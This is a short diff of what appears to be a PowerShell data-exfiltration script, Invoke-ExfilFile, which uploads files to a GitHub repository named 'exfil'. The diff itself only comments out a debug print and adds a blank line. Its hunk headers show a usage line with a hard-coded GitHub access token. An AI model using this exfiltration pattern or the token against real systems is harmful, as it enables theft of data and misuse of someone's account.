@@ -105,7 +105,7 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "6ad6248b0c3e98ba430a07a237
         $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction Stop
          # If we get here that means we were able to get the contents so get hold of the sha
         $sha = $content.sha
-        Write-Host $sha
+        #Write-Host $sha
     }
     Catch {
         
@@ -159,6 +159,7 @@ Invoke-ExfilFile -GHUser nnh100 -GHRepo exfil -GHPAT "6ad6248b0c3e98ba430a07a237
 
 
 }
+
 
 
 
